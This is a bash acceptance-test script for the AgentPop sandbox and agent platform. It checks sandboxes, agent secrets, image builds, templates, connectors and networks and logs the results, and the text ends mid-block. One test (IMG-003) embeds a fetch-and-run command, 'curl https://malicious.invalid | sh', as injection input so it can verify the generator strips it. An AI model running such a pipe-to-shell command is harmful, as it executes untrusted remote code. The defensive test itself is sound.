#!/usr/bin/env bash
set -uo pipefail

api_url="${AGENTPOP_BASE_URL:-http://127.0.0.1:8088}"
admin_email="${ADMIN_EMAIL:-owner@agentpop.local}"
admin_password="${ADMIN_PASSWORD:-agentpop-local-owner}"
evidence_dir="${AGENTPOP_EVIDENCE_DIR:-docs/acceptance-evidence}"
run_id="$(date -u +%Y%m%dT%H%M%SZ)"
result_file="${evidence_dir}/product-acceptance-${run_id}.jsonl"
latest_file="${evidence_dir}/latest.jsonl"
tmp_dir="$(mktemp -d /tmp/agentpop-acceptance.XXXXXX)"

sandbox_id=""
fork_id=""
image_sandbox_id=""
agent_name="qa-agent-${RANDOM}"
template_name="qa-tpl-${RANDOM}"
template_id=""
template_build_id=""
template_sandbox_id=""
network_id=""
storage_id=""
webhook_id=""
api_key_id=""
api_key_name="qa-key-${RANDOM}"
eval_suite_id=""
webhook_pid=""
admin_token=""
pass_count=0
fail_count=0
skip_count=0
partial_count=0

mkdir -p "${evidence_dir}"
: >"${result_file}"

record() {
  local id="$1" status="$2" surface="$3" detail="$4"
  jq -cn \
    --arg id "${id}" \
    --arg status "${status}" \
    --arg surface "${surface}" \
    --arg detail "${detail}" \
    --arg at "$(date -u +%FT%TZ)" \
    '{id:$id,status:$status,surface:$surface,detail:$detail,verifiedAt:$at}' >>"${result_file}"
  case "${status}" in
    PASS) pass_count=$((pass_count + 1)) ;;
    FAIL) fail_count=$((fail_count + 1)) ;;
    SKIP-LIVE) skip_count=$((skip_count + 1)) ;;
    PARTIAL) partial_count=$((partial_count + 1)) ;;
  esac
  printf '%-10s %-34s %s\n' "${status}" "${id}" "${detail}"
}

check() {
  local id="$1" surface="$2" detail="$3"
  shift 3
  if "$@" >/dev/null 2>"${tmp_dir}/${id}.err"; then
    record "${id}" PASS "${surface}" "${detail}"
  else
    local error
    error="$(tr '\n' ' ' <"${tmp_dir}/${id}.err" | cut -c1-400)"
    record "${id}" FAIL "${surface}" "${detail}${error:+ — ${error}}"
  fi
}

json_get() {
  local path="$1"
  curl -fsS "${api_url}${path}"
}

cleanup() {
  if [[ -n "${webhook_pid}" ]]; then
    kill "${webhook_pid}" >/dev/null 2>&1 || true
    wait "${webhook_pid}" 2>/dev/null || true
  fi
  [[ -z "${api_key_id}" ]] || curl -fsS -X DELETE "${api_url}/v1/api-keys/${api_key_id}" >/dev/null 2>&1 || true
  [[ -z "${webhook_id}" ]] || curl -fsS -X DELETE "${api_url}/v1/webhooks/${webhook_id}" >/dev/null 2>&1 || true
  [[ -z "${storage_id}" ]] || curl -fsS -X DELETE "${api_url}/v1/storages/${storage_id}" >/dev/null 2>&1 || true
  [[ -z "${network_id}" ]] || curl -fsS -X DELETE "${api_url}/v1/networks/${network_id}" >/dev/null 2>&1 || true
  curl -fsS -X DELETE "${api_url}/v1/agents/${agent_name}" >/dev/null 2>&1 || true
  [[ -z "${image_sandbox_id}" ]] || curl -fsS -X DELETE "${api_url}/v1/sandboxes/${image_sandbox_id}" >/dev/null 2>&1 || true
  [[ -z "${fork_id}" ]] || curl -fsS -X DELETE "${api_url}/v1/sandboxes/${fork_id}" >/dev/null 2>&1 || true
  [[ -z "${sandbox_id}" ]] || curl -fsS -X DELETE "${api_url}/v1/sandboxes/${sandbox_id}" >/dev/null 2>&1 || true
  [[ -z "${template_sandbox_id}" ]] || curl -fsS -X DELETE "${api_url}/v1/sandboxes/${template_sandbox_id}" >/dev/null 2>&1 || true
  if [[ -n "${template_id}" ]]; then
    curl -fsS -X POST "${api_url}/v1/templates/${template_id}/restore" >/dev/null 2>&1 || true
    curl -fsS -X DELETE "${api_url}/v1/templates/${template_id}" >/dev/null 2>&1 || true
  fi
  cp "${result_file}" "${latest_file}" 2>/dev/null || true
  rm -rf "${tmp_dir}"
}
trap cleanup EXIT

command -v curl >/dev/null || { echo "curl is required" >&2; exit 2; }
command -v jq >/dev/null || { echo "jq is required" >&2; exit 2; }

check WEB-001 "public web" "Marketing shell responds" curl -fsS "${api_url}/"
check WEB-002 "public web" "Sign-in route responds through SPA fallback" curl -fsS "${api_url}/signin"
check WEB-003 "customer web" "Dashboard route responds through SPA fallback" curl -fsS "${api_url}/app/overview"
check WEB-004 "operator web" "Admin login route responds through SPA fallback" curl -fsS "${api_url}/admin/login"
check API-001 "public API" "Public health endpoint is healthy without exposing fleet internals" bash -c "curl -fsS '${api_url}/healthz' | jq -e '.healthy == true and .dataPlane == null and .stateStore == null'"
check API-002 "public API" "Catalog publishes sizes, events, roles, and scopes" bash -c "curl -fsS '${api_url}/v1/catalog' | jq -e '(.sizes|length)>0 and (.events|length)>0 and (.roles|length)>0 and (.scopes|length)>0'"
check API-003 "control plane" "Control-plane status includes a registered host" bash -c "curl -fsS '${api_url}/v1/control-plane/status' | jq -e '.healthy == true and (.dataPlaneHosts|length)==1'"
check API-004 "data plane" "Data-plane host inventory is healthy" bash -c "curl -fsS '${api_url}/v1/data-plane/hosts' | jq -e '(.items|length)==1 and .items[0].healthy == true'"
check API-005 "health UI" "Platform health exposes control-plane and host capacity" bash -c "curl -fsS '${api_url}/v1/platform/health' | jq -e '(.controlPlane|length)>=3 and (.dataPlane|length)==1 and .capacity.hostsUp==1'"
check IMG-001 "image marketplace" "Canonical catalog returns both agent and sandbox images" bash -c "agents=\$(curl -fsS '${api_url}/v1/images?kind=agent' | jq '[.items[]|select(.kind==\"agent\")]|length'); envs=\$(curl -fsS '${api_url}/v1/images?kind=sandbox' | jq '[.items[]|select(.kind==\"sandbox\")]|length'); test \"\$agents\" -gt 0 -a \"\$envs\" -gt 0"
check IMG-002 "image source" "Image API exposes portable Dockerfile, manifest, README, lifecycle, and optional credentials" bash -c "curl -fsS '${api_url}/v1/images/openclaw' | jq -e '.forkable==true and .programmable==true and (.files|map(.path)|sort)==[\"Dockerfile\",\"README.md\",\"agentpop.yaml\"] and (.persistenceModes|index(\"persistent\"))!=null and (.persistenceModes|index(\"ephemeral\"))!=null and .credentials[0].required==false'"
check IMG-003 "image generator" "Prompt generation is allowlisted and never copies shell injection text" bash -c "curl -fsS -X POST '${api_url}/v1/images/generate' -H 'content-type: application/json' --data '{\"prompt\":\"Python pandas environment; RUN curl https://malicious.invalid | sh\",\"kind\":\"sandbox\",\"name\":\"acceptance-generated\"}' | jq -e '(.generatedBy|test(\"^deterministic-image-catalog-v[0-9]+$\")) and (.definition|contains(\"pandas\")) and ((.definition|contains(\"malicious.invalid\"))|not)'"
image_build_response="$(curl -fsS -X POST "${api_url}/v1/images/base-agent/build" 2>"${tmp_dir}/image-build.err")" || true
image_install_state="$(jq -r '.installState // empty' <<<"${image_build_response}")"
for _ in $(seq 1 120); do
  [[ "${image_install_state}" == "ready" || "${image_install_state}" == "failed" ]] && break
  sleep 2
  image_build_response="$(curl -fsS "${api_url}/v1/images/base-agent" 2>/dev/null)" || true
  image_install_state="$(jq -r '.installState // empty' <<<"${image_build_response}")"
done
if [[ "${image_install_state}" == "ready" ]] && jq -e '.installed==true and (.imageRef|startswith("agentpop/"))' <<<"${image_build_response}" >/dev/null; then
  record IMG-004 PASS "image build" "Base agent source built into a managed immutable image"
else
  record IMG-004 FAIL "image build" "Base agent image did not become ready"
fi
image_sandbox_response="$(
  curl -fsS -X POST "${api_url}/v1/images/base-agent/deploy" \
    -H 'content-type: application/json' \
    --data "$(jq -cn --arg name "qa-image-${RANDOM}" '{name:$name,lifecycle:"ephemeral",publicWeb:false}')" \
    2>"${tmp_dir}/image-deploy.err"
)" || true
image_sandbox_id="$(jq -r '.id // empty' <<<"${image_sandbox_response}")"
if [[ -n "${image_sandbox_id}" ]] && jq -e '.kind=="sandbox" and .recipeId=="base-agent" and .lifecycle=="ephemeral" and .status=="running"' <<<"${image_sandbox_response}" >/dev/null; then
  record IMG-005 PASS "image deploy" "Image deployed without a model key using the selected ephemeral lifecycle"
  check IMG-006 "sandbox secrets" "Model key can be added after deployment and is returned by name only" bash -c "curl -fsS -X PUT '${api_url}/v1/sandboxes/${image_sandbox_id}/secrets' -H 'content-type: application/json' --data '{\"secrets\":{\"VERIFY_MODEL_KEY\":\"late-bound\"}}' >/dev/null && curl -fsS '${api_url}/v1/sandboxes/${image_sandbox_id}/secrets' | jq -e '.status==\"applied\" and .items[0].name==\"VERIFY_MODEL_KEY\" and (.items[0]|has(\"value\")|not)'"
  secret_exec_payload='{"command":"test \"$VERIFY_MODEL_KEY\" = late-bound"}'
  check IMG-007 "sandbox secrets" "Late-bound model key is injected into the running image" \
    bash -c 'curl -fsS -X POST "$1/v1/sandboxes/$2/exec" -H "content-type: application/json" --data "$3" | jq -e ".exitCode==0"' \
    _ "${api_url}" "${image_sandbox_id}" "${secret_exec_payload}"
else
  record IMG-005 FAIL "image deploy" "Base image deployment failed"
  record IMG-006 FAIL "sandbox secrets" "No image sandbox was available for late-bound secret verification"
  record IMG-007 FAIL "sandbox secrets" "No image sandbox was available for runtime secret injection"
fi
check SUB-001 "subscription" "Hosted product publishes one fixed 20 USD monthly plan without credits" bash -c "curl -fsS '${api_url}/v1/subscription' | jq -e '.billingModel==\"fixed-subscription\" and .usageCredits==false and .plan.price==20 and .plan.interval==\"month\"'"
check DOC-001 "developer discovery" "llms.txt is plain developer discovery rather than SPA HTML" bash -c "body=\$(curl -fsS '${api_url}/llms.txt'); printf '%s' \"\$body\" | grep -q 'AgentPop' && ! printf '%s' \"\$body\" | grep -qi '<html'"
check DOC-002 "OpenAPI" "Public OpenAPI contains canonical image, sandbox-secret, connector-tool, and subscription paths" bash -c "spec=\$(curl -fsS '${api_url}/openapi.yaml'); printf '%s' \"\$spec\" | grep -q '^  /v1/images:' && printf '%s' \"\$spec\" | grep -Eq '^  /v1/images/\\{[^}]+\\}/deploy:' && printf '%s' \"\$spec\" | grep -q '^  /v1/sandboxes/{sandboxId}/secrets:' && printf '%s' \"\$spec\" | grep -q '^  /v1/connectors/{connectorId}/tools:' && printf '%s' \"\$spec\" | grep -q '^  /v1/subscription:'"

sandbox_response="$(
  curl -fsS -X POST "${api_url}/v1/sandboxes" \
    -H 'content-type: application/json' \
    -H "idempotency-key: acceptance-${run_id}" \
    --data '{"name":"acceptance-box","vcpu":0.25,"memoryMb":512,"diskGb":10,"publicWeb":true,"pauseWhenIdle":false,"idleTimeoutSec":900,"ttlSeconds":0,"allowedEgress":["github.com:443"],"environment":{"ACCEPTANCE_VALUE":"works"}}' 2>"${tmp_dir}/sandbox-create.err"
)" || true
sandbox_id="$(jq -r '.id // empty' <<<"${sandbox_response}")"
if [[ -n "${sandbox_id}" ]]; then
  record SBX-001 PASS "sandboxes" "Created isolated sandbox ${sandbox_id}"
else
  record SBX-001 FAIL "sandboxes" "Sandbox creation failed — $(tr '\n' ' ' <"${tmp_dir}/sandbox-create.err")"
fi

if [[ -n "${sandbox_id}" ]]; then
  check SBX-002 "sandboxes" "Idempotency replays the original sandbox" bash -c "curl -fsS -D '${tmp_dir}/headers' -X POST '${api_url}/v1/sandboxes' -H 'content-type: application/json' -H 'idempotency-key: acceptance-${run_id}' --data '{\"name\":\"acceptance-box\"}' | jq -e '.id==\"${sandbox_id}\"' && grep -qi '^Idempotent-Replayed: true' '${tmp_dir}/headers'"
  check SBX-003 "sandbox detail / terminal" "Exec runs inside the sandbox with its environment" bash -c "curl -fsS -X POST '${api_url}/v1/sandboxes/${sandbox_id}/exec' -H 'content-type: application/json' --data '{\"command\":\"test \\\"\$ACCEPTANCE_VALUE\\\" = works && printf exec-ok\"}' | jq -e '.exitCode==0 and .stdout==\"exec-ok\"'"
  check SBX-003A "sandbox detail / logs" "Real exec stdout is persisted in the sandbox log stream" bash -c "curl -fsS '${api_url}/v1/sandboxes/${sandbox_id}/logs?limit=100' | jq -e '(.items|map(select(.stream==\"stdout\" and .message==\"exec-ok\"))|length)==1'"
  check SBX-004 "sandbox detail / configuration" "Configuration updates desired and runtime state" bash -c "curl -fsS -X PATCH '${api_url}/v1/sandboxes/${sandbox_id}' -H 'content-type: application/json' --data '{\"pauseWhenIdle\":true,\"idleTimeoutSec\":1200,\"environment\":{\"ACCEPTANCE_VALUE\":\"updated\"}}' | jq -e '.pauseWhenIdle==true and .idleTimeoutSec==1200 and .environment.ACCEPTANCE_VALUE==\"updated\"'"
  check SBX-005 "sandbox detail / files" "File upload writes bytes into the guest" bash -c "printf 'acceptance-file' | curl -fsS -X PUT '${api_url}/v1/sandboxes/${sandbox_id}/files?path=%2Fworkspace%2Facceptance.txt' --data-binary @-"
  check SBX-006 "sandbox detail / files" "File listing returns the uploaded file" bash -c "curl -fsS '${api_url}/v1/sandboxes/${sandbox_id}/files' | jq -e 'map(select(.name==\"acceptance.txt\"))|length==1'"
  check SBX-007 "sandbox detail / files" "File download returns exact guest bytes" bash -c "test \"\$(curl -fsS '${api_url}/v1/sandboxes/${sandbox_id}/files?path=%2Fworkspace%2Facceptance.txt')\" = acceptance-file"
  check SBX-008 "sandbox detail / files" "Directory creation is reflected in listing" bash -c "curl -fsS -X POST '${api_url}/v1/sandboxes/${sandbox_id}/directories' -H 'content-type: application/json' --data '{\"path\":\"/workspace/acceptance-dir\"}' >/dev/null && curl -fsS '${api_url}/v1/sandboxes/${sandbox_id}/files' | jq -e 'map(select(.name==\"acceptance-dir\" and .dir==true))|length==1'"
  check SBX-009 "sandbox detail / metrics" "Runtime metrics are sampled from the guest" bash -c "curl -fsS '${api_url}/v1/sandboxes/${sandbox_id}/metrics' | jq -e '.memoryTotalMb>0 and .diskTotalMb>0 and .processCount>0'"
  check SBX-010 "sandbox detail / events" "Sandbox event history contains create and exec" bash -c "curl -fsS '${api_url}/v1/sandboxes/${sandbox_id}/events' | jq -e '(.items|map(.action)|index(\"sandbox.create\"))!=null and (.items|map(.action)|index(\"sandbox.exec\"))!=null'"
  check SBX-011 "sandbox detail / SSH" "SSH discovery returns host, user, key, and executable command" bash -c "curl -fsS '${api_url}/v1/sandboxes/${sandbox_id}/ssh' | jq -e '.command|startswith(\"ssh \")'"

  curl -fsS -X POST "${api_url}/v1/sandboxes/${sandbox_id}/exec" -H 'content-type: application/json' \
    --data '{"command":"python3 -m http.server 18080 --directory /workspace >/tmp/http.log 2>&1 &"}' >/dev/null
  check SBX-012 "sandbox detail / ports" "Public preview port can be exposed" bash -c "curl -fsS -X POST '${api_url}/v1/sandboxes/${sandbox_id}/ports' -H 'content-type: application/json' --data '{\"port\":18080,\"mode\":\"public\"}' | jq -e '.ports|map(select(.port==18080 and .mode==\"public\"))|length==1'"
  check SBX-013 "sandbox detail / ports" "Edge preview proxies to the guest service" bash -c "sleep 1; curl -fsS '${api_url}/preview/${sandbox_id}/18080/acceptance.txt' | grep -qx 'acceptance-file'"
  check SBX-014 "sandbox detail / ports" "Exposed port can be removed" bash -c "curl -fsS -X DELETE '${api_url}/v1/sandboxes/${sandbox_id}/ports/18080' | jq -e '(.ports // [])|map(select(.port==18080))|length==0'"

  fork_response="$(curl -fsS -X POST "${api_url}/v1/sandboxes/${sandbox_id}:fork" 2>"${tmp_dir}/fork.err")" || true
  fork_id="$(jq -r '.id // empty' <<<"${fork_response}")"
  if [[ -n "${fork_id}" ]]; then
    record SBX-015 PASS "sandboxes / fork" "Fork created ${fork_id}"
    check SBX-016 "sandboxes / fork" "Fork copies workspace content" bash -c "curl -fsS -X POST '${api_url}/v1/sandboxes/${fork_id}/exec' -H 'content-type: application/json' --data '{\"command\":\"test -f /workspace/acceptance.txt\"}' | jq -e '.exitCode==0'"
  else
    record SBX-015 FAIL "sandboxes / fork" "Fork failed"
  fi
  check SBX-017 "sandboxes / pause" "Pause transitions runtime and desired state" bash -c "curl -fsS -X POST '${api_url}/v1/sandboxes/${sandbox_id}/pause' | jq -e '.status==\"paused\"'"
  check SBX-018 "sandboxes / resume" "Resume restores runtime execution" bash -c "curl -fsS -X POST '${api_url}/v1/sandboxes/${sandbox_id}/resume' | jq -e '.status==\"running\"'"
  check SBX-019 "sandbox detail / files" "File and directory deletion removes guest paths" bash -c "curl -fsS -X DELETE '${api_url}/v1/sandboxes/${sandbox_id}/files?path=%2Fworkspace%2Facceptance-dir' >/dev/null && curl -fsS -X DELETE '${api_url}/v1/sandboxes/${sandbox_id}/files?path=%2Fworkspace%2Facceptance.txt' >/dev/null"
fi

agent_response="$(
  jq -n --arg name "${agent_name}" '{
    name:$name,template:"openclaw-compatible",model:"provider/model",
    vcpu:0.25,memoryMb:512,diskGb:5,
    secrets:{OPENAI_API_KEY:"acceptance-secret"}
  }' | curl -fsS -X POST "${api_url}/v1/agents" -H 'content-type: application/json' --data @- 2>"${tmp_dir}/agent.err"
)" || true
if jq -e --arg name "${agent_name}" '.name==$name and .status=="running" and .secretNames==["OPENAI_API_KEY"] and (has("secrets")|not)' <<<"${agent_response}" >/dev/null; then
  record AGT-001 PASS "agents / deploy" "Agent deployed with redacted BYOK secret"
else
  record AGT-001 FAIL "agents / deploy" "Agent deployment failed"
fi
check AGT-002 "agents" "Agent appears in inventory" bash -c "curl -fsS '${api_url}/v1/agents' | jq -e --arg n '${agent_name}' '.items|map(select(.name==\$n))|length==1'"
check AGT-003 "agents / model keys" "Secret metadata is readable but values are never returned" bash -c "curl -fsS '${api_url}/v1/agents/${agent_name}/secrets' | jq -e '.status==\"applied\" and .items[0].name==\"OPENAI_API_KEY\" and (.items[0]|has(\"value\")|not)'"
check AGT-004 "agents / model keys" "Secret is injected into the agent sandbox" bash -c "sid=\$(curl -fsS '${api_url}/v1/agents'|jq -r --arg n '${agent_name}' '.items[]|select(.name==\$n)|.sandboxId'); curl -fsS -X POST '${api_url}/v1/sandboxes/'\"\$sid\"'/exec' -H 'content-type: application/json' --data '{\"command\":\"test \\\"\$OPENAI_API_KEY\\\" = acceptance-secret\"}' | jq -e '.exitCode==0'"
check AGT-005 "agents / logs" "Agent lifecycle logs are available" bash -c "curl -fsS '${api_url}/v1/agents/${agent_name}/logs' | jq -e 'length>=2'"
check AGT-006 "agents / stop" "Stop pauses the bound sandbox" bash -c "curl -fsS -X POST '${api_url}/v1/agents/${agent_name}:stop' | jq -e '.status==\"stopped\"'"
check AGT-007 "agents / restart" "Restart resumes the bound sandbox and reapplies secrets" bash -c "curl -fsS -X POST '${api_url}/v1/agents/${agent_name}:restart' | jq -e '.status==\"running\" and .appliedSecretsGeneration==.secretsGeneration'"
check AGT-008 "agents / model keys" "Secret rotation increments applied generation" bash -c "curl -fsS -X PUT '${api_url}/v1/agents/${agent_name}/secrets' -H 'content-type: application/json' --data '{\"secrets\":{\"OPENAI_API_KEY\":\"rotated-secret\"}}' | jq -e '.generation==2 and .appliedGeneration==2'"

eval_suite_response="$(
  jq -n '{
    version:1,scenario:"acceptance-readiness",description:"Acceptance suite",
    runner:{type:"command",command:"python3 -c '\''import json,sys; p=json.load(sys.stdin); print(json.dumps({\"output\":\"ready: \"+p.get(\"user\",\"\") ,\"metrics\":{\"estimated_cost_usd\":0.001},\"business_metrics\":{\"ready\":True},\"events\":[]}))'\''",timeoutSeconds:30},
    gate:{minScore:1},
    tests:[{id:"ready",input:{user:"health"},assert:{limits:{max_duration_ms:5000,max_agent_errors:0},metrics:{max:{estimated_cost_usd:0.01}},business_metrics:{ready:true},final_answer:{contains:["ready"]},secrets:{forbidden:true}},judges:[{type:"deterministic"}]}]
  }' | curl -fsS -X POST "${api_url}/v1/agents/${agent_name}/eval-suites" -H 'content-type: application/json' --data @- 2>"${tmp_dir}/eval.err"
)" || true
eval_suite_id="$(jq -r '.id // empty' <<<"${eval_suite_response}")"
if [[ -n "${eval_suite_id}" ]]; then
  record EVAL-001 PASS "agents / evaluations" "Eval suite persisted for the agent"
  check EVAL-002 "agents / evaluations" "Eval executes inside the sandbox and passes its release gate" bash -c "curl -fsS -X POST '${api_url}/v1/eval-suites/${eval_suite_id}/runs' -H 'content-type: application/json' --data '{\"environment\":\"sandbox\"}' | jq -e '.passed==true and .score==1 and .metrics.cases_passed==1'"
  check EVAL-003 "agents / evaluations" "Eval history is queryable by agent" bash -c "curl -fsS '${api_url}/v1/agents/${agent_name}/eval-runs' | jq -e --arg s '${eval_suite_id}' '.items|map(select(.suiteId==\$s and .passed==true))|length==1'"
else
  record EVAL-001 FAIL "agents / evaluations" "Eval suite creation failed"
fi

template_response="$(
  jq -n --arg name "${template_name}" '{
    name:$name,
    description:"Acceptance template",
    definition:"FROM agentpop/devbox:local\nRUN echo template-acceptance > /etc/agentpop-template-marker\nRUN echo second-step-ok"
  }' | curl -fsS -X POST "${api_url}/v1/templates" -H 'content-type: application/json' --data @- 2>"${tmp_dir}/template-create.err"
)" || true
template_id="$(jq -r '.id // empty' <<<"${template_response}")"
build_status=""
if [[ -n "${template_id}" ]]; then
  build_response="$(curl -fsS -X POST "${api_url}/v1/templates/${template_id}/builds" 2>"${tmp_dir}/template-build.err")" || true
  template_build_id="$(jq -r '.id // empty' <<<"${build_response}")"
  if [[ -n "${template_build_id}" ]]; then
    for _ in $(seq 1 120); do
      build_status="$(curl -fsS "${api_url}/v1/template-builds/${template_build_id}" 2>/dev/null | jq -r '.status // empty')"
      [[ "${build_status}" == "succeeded" || "${build_status}" == "failed" ]] && break
      sleep 2
    done
  fi
fi
template_image=""
if [[ "${build_status}" == "succeeded" ]]; then
  template_image="$(curl -fsS "${api_url}/v1/templates/${template_id}" 2>/dev/null | jq -r 'select(.status=="ready")|.imageRef // empty')"
fi
if [[ -n "${template_image}" ]]; then
  template_sandbox_response="$(
    jq -n --arg image "${template_name}" '{name:"qa-tpl-box",image:$image,vcpu:0.25,memoryMb:512,diskGb:5}' \
      | curl -fsS -X POST "${api_url}/v1/sandboxes" -H 'content-type: application/json' --data @- 2>"${tmp_dir}/template-sandbox.err"
  )" || true
  template_sandbox_id="$(jq -r '.id // empty' <<<"${template_sandbox_response}")"
fi
if [[ -n "${template_sandbox_id}" ]] && curl -fsS -X POST "${api_url}/v1/sandboxes/${template_sandbox_id}/exec" -H 'content-type: application/json' \
    --data '{"command":"cat /etc/agentpop-template-marker"}' | jq -e '.exitCode==0 and (.stdout|contains("template-acceptance"))' >/dev/null 2>&1; then
  record TPL-001 PASS "templates / build" "Definition built into immutable image ${template_image}; new sandbox boots from it with build artifacts present"
else
  template_error="$(tr '\n' ' ' <"${tmp_dir}/template-create.err" 2>/dev/null | cut -c1-160)"
  [[ -n "${template_error}" ]] || template_error="$(tr '\n' ' ' <"${tmp_dir}/template-build.err" 2>/dev/null | cut -c1-160)"
  record TPL-001 FAIL "templates / build" "Template build did not produce a bootable immutable image (build=${build_status:-none})${template_error:+ — ${template_error}}"
fi
if [[ -n "${template_build_id}" ]]; then
  check TPL-002 "templates / build logs" "Persisted builder logs include steps, command output, and result" bash -c "curl -fsS '${api_url}/v1/template-builds/${template_build_id}/logs' | jq -e '(.items|length)>=4 and (.items|map(select(.stream==\"system\" and (.line|startswith(\"STEP 1/\"))))|length)==1 and (.items|map(select(.stream==\"stdout\" and (.line|contains(\"second-step-ok\"))))|length)>=1 and (.items|map(select(.line|contains(\"BUILD SUCCEEDED\")))|length)==1'"
else
  record TPL-002 FAIL "templates / build logs" "No build was started, so no logs exist"
fi
tpl3_detail=""
if [[ -n "${template_id}" && -n "${template_sandbox_id}" ]]; then
  if ! curl -fsS -X POST "${api_url}/v1/templates/${template_id}/deprecate" 2>/dev/null | jq -e '.deprecated==true and .status=="deprecated"' >/dev/null; then
    tpl3_detail="deprecation did not persist"
  else
    blocked_status="$(jq -n --arg image "${template_name}" '{name:"qa-tpl-blocked",image:$image}' \
      | curl -sS -o "${tmp_dir}/template-blocked.json" -w '%{http_code}' -X POST "${api_url}/v1/sandboxes" -H 'content-type: application/json' --data @-)"
    if [[ "${blocked_status}" != "409" ]]; then
      tpl3_detail="deprecated template create returned HTTP ${blocked_status} instead of 409"
      blocked_sandbox="$(jq -r '.id // empty' "${tmp_dir}/template-blocked.json" 2>/dev/null)"
      [[ -z "${blocked_sandbox}" ]] || curl -fsS -X DELETE "${api_url}/v1/sandboxes/${blocked_sandbox}" >/dev/null 2>&1 || true
    elif ! curl -fsS "${api_url}/v1/sandboxes/${template_sandbox_id}" | jq -e '.status=="running"' >/dev/null; then
      tpl3_detail="existing sandbox did not keep running after deprecation"
    fi
  fi
else
  tpl3_detail="no built template/sandbox to exercise"
fi
if [[ -z "${tpl3_detail}" ]]; then
  record TPL-003 PASS "templates / deprecate" "Deprecation blocks new sandboxes (409) while the existing runtime keeps running"
else
  record TPL-003 FAIL "templates / deprecate" "${tpl3_detail}"
fi

connector_inventory="$(curl -fsS "${api_url}/v1/connectors" 2>"${tmp_dir}/connector-list.err")" || true
connector_configured="$(jq -r '.configured // false' <<<"${connector_inventory}")"
if jq -e '(.items|length)>=4 and .provider=="composio"' <<<"${connector_inventory}" >/dev/null; then
  record CON-000 PASS "connectors" "Composio-backed connector inventory is exposed"
else
  record CON-000 FAIL "connectors" "Connector inventory failed"
fi

if [[ "${connector_configured}" == "true" ]]; then
  connector_authorization="$(curl -fsS -X POST "${api_url}/v1/connectors/github/authorize" -H 'content-type: application/json' --data '{}' 2>"${tmp_dir}/connector-authorize.err")" || true
  connector_pending_id="$(jq -r '.pendingId // empty' <<<"${connector_authorization}")"
  if jq -e '.authorizationUrl|startswith("https://connect.composio.dev/")' <<<"${connector_authorization}" >/dev/null && [[ -n "${connector_pending_id}" ]]; then
    record CON-001 PASS "connectors / OAuth" "Real Composio Connect Link and single-use pending state created"
    callback_status="$(curl -sS -o /dev/null -w '%{http_code}' "${api_url}/v1/connectors/composio/callback?state=${connector_pending_id}&status=failed")"
    if [[ "${callback_status}" == "302" ]]; then
      record CON-003 PASS "connectors / callback" "OAuth callback consumed pending state and redirected safely"
    else
      record CON-003 FAIL "connectors / callback" "OAuth callback returned HTTP ${callback_status}"
    fi
  else
    record CON-001 FAIL "connectors / OAuth" "Composio Connect Link creation failed"
    record CON-003 FAIL "connectors / callback" "No OAuth pending state was available to test"
  fi
  check CON-006 "connectors / catalog" "Live Composio catalog search returns provider toolkits" bash -c "curl -fsS '${api_url}/v1/connectors/catalog?q=github&limit=5' | jq -e '.configured==true and (.items|map(select(.slug==\"github\"))|length)==1'"
else
  record CON-001 SKIP-LIVE "connectors / OAuth" "Broker is reachable but COMPOSIO_API_KEY is not configured"
  record CON-003 SKIP-LIVE "connectors / callback" "A real provider callback requires COMPOSIO_API_KEY and user OAuth"
  record CON-006 SKIP-LIVE "connectors / catalog" "Live Composio catalog requires COMPOSIO_API_KEY"
fi

# The unconnected-provider guards must run against a provider that is
# actually unconnected right now. GitHub is excluded because the CON-001/003
# callback flow above can legitimately connect it when the Composio project
# already holds an active GitHub account for this owner.
# The control-plane connection guard applies whether or not the broker has a
# platform key, so only "connected" matters when picking the guard target.
guard_connector="$(curl -fsS "${api_url}/v1/connectors" 2>/dev/null | jq -r '[.items[] | select(.connected==false and .id!="github")][0].id // empty')"
if [[ -n "${guard_connector}" ]]; then
  guard_tool="$(tr '[:lower:]-' '[:upper:]_' <<<"${guard_connector}")_GUARD_CHECK"
  invoke_status="$(curl -sS -o "${tmp_dir}/connector-invoke.json" -w '%{http_code}' -X POST "${api_url}/v1/connectors/${guard_connector}/tools/${guard_tool}" -H 'content-type: application/json' --data '{"arguments":{}}')"
  if [[ "${invoke_status}" == "409" ]] && jq -e '.error=="connector_not_connected"' "${tmp_dir}/connector-invoke.json" >/dev/null; then
    record CON-004 PASS "connectors / invocation" "Invocation endpoint blocks the unconnected provider ${guard_connector}"
  else
    record CON-004 FAIL "connectors / invocation" "Expected unconnected invocation denial for ${guard_connector}; received HTTP ${invoke_status}"
  fi
  grant_status="$(curl -sS -o "${tmp_dir}/connector-grant.json" -w '%{http_code}' -X PATCH "${api_url}/v1/connectors/${guard_connector}/connections" -H 'content-type: application/json' --data "{\"actions\":[\"${guard_tool}\"]}")"
  if [[ "${grant_status}" == "404" ]]; then
    record CON-002 PASS "connectors / grants" "Grant mutation refuses to fabricate a connection before OAuth (${guard_connector})"
  else
    record CON-002 FAIL "connectors / grants" "Unconnected grant update for ${guard_connector} should fail; received HTTP ${grant_status}"
  fi
else
  record CON-004 PARTIAL "connectors / invocation" "Every launch provider is currently connected; disconnect one to exercise the unconnected invocation guard"
  record CON-002 PARTIAL "connectors / grants" "Every launch provider is currently connected; disconnect one to exercise the unconnected grant guard"
fi

if [[ "${AGENTPOP_ALLOW_CONNECTOR_REVOKE:-0}" == "1" ]] && curl -fsS -X DELETE "${api_url}/v1/connectors/github/connections" >/dev/null; then
  record CON-005 PASS "connectors / revoke" "Opt-in destructive acceptance revoked the upstream account before deleting local and agent grants"
elif [[ "${AGENTPOP_ALLOW_CONNECTOR_REVOKE:-0}" != "1" ]]; then
  record CON-005 SKIP-LIVE "connectors / revoke" "Provider revoke is destructive and requires AGENTPOP_ALLOW_CONNECTOR_REVOKE=1"
else
  record CON-005 FAIL "connectors / revoke" "Connector revocation failed"
fi

network_response="$(curl -fsS -X POST "${api_url}/v1/networks" -H 'content-type: application/json' --data '{"name":"qa-network","cidr":"10.77.0.0/24","region":"local"}' 2>"${tmp_dir}/network.err")" || true
network_id="$(jq -r '.id // empty' <<<"${network_response}")"
if [[ -n "${network_id}" ]]; then record NET-001 PASS "networks" "Network record created"; else record NET-001 FAIL "networks" "Network creation failed"; fi
if [[ -n "${network_id}" && -n "${sandbox_id}" ]]; then
  check NET-002 "networks" "Sandbox attachment is persisted" bash -c "curl -fsS -X POST '${api_url}/v1/networks/${network_id}/members' -H 'content-type: application/json' --data '{\"sandboxId\":\"${sandbox_id}\"}' | jq -e '.members==1'"
  record NET-003 PARTIAL "networks / data plane" "Attachment is topology metadata; runtime network isolation/routing is not enforced"
  check NET-004 "networks" "Sandbox can be detached" bash -c "curl -fsS -X DELETE '${api_url}/v1/networks/${network_id}/members/${sandbox_id}' | jq -e '.members==0'"
